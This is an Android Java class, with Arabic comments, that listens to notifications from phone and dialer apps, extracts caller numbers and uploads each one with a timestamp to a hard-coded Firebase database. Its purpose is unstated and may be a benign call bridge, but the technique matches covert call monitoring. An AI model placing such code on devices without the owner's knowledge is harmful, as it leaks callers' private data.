package com.cdma.gsm.call;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;

public class CallNotificationListener extends NotificationListenerService {

    private static final String TAG = "NotificationBridge";
    private static final String DB_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private String lastCapturedNumber = "";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // فحص ما إذا كان الإشعار قادماً من تطبيق الهاتف أو إدارة المكالمات
        String packageName = sbn.getPackageName();
        
        if (isCallApp(packageName)) {
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;

            // استخراج العنوان (غالباً يكون رقم المتصل أو اسمه)
            String title = extras.getString(Notification.EXTRA_TITLE);
            // استخراج النص الإضافي (قد يحتوي على الرقم إذا كان العنوان هو الاسم)
            String text = extras.getString(Notification.EXTRA_TEXT);

            Log.d(TAG, "إشعار مكالمة من: " + packageName + " | العنوان: " + title);

            // تنظيف النص المستخرج للبحث عن أرقام
            processAndSend(title);
            processAndSend(text);
        }
    }

    private boolean isCallApp(String pkg) {
        return pkg.contains("dialer") || pkg.contains("telecom") || 
               pkg.contains("phone") || pkg.contains("incallui");
    }

    private void processAndSend(String rawText) {
        if (rawText == null || rawText.isEmpty()) return;

        // إزالة المسافات والرموز مثل (-) للحصول على الرقم الخام
        String cleanNumber = rawText.replaceAll("[^0-9+]", "");

        // التأكد أن النص يحتوي على رقم هاتف منطقي (أكثر من 6 أرقام)
        if (cleanNumber.length() >= 7 && !cleanNumber.equals(lastCapturedNumber)) {
            lastCapturedNumber = cleanNumber;
            sendToFirebase(cleanNumber);
        }
    }

    private void sendToFirebase(String number) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance(DB_URL);
            DatabaseReference myRef = database.getReference("bridge_signals");

            Map<String, Object> data = new HashMap<>();
            data.put("number", number);
            data.put("type", "CALL");
            data.put("method", "NotificationListener");
            data.put("timestamp", System.currentTimeMillis());

            myRef.setValue(data).addOnSuccessListener(aVoid -> 
                Log.d(TAG, "تم إرسال الرقم من الإشعارات إلى Firebase")
            );
        } catch (Exception e) {
            Log.e(TAG, "خطأ في إرسال بيانات الإشعار: " + e.getMessage());
        }
    }
}
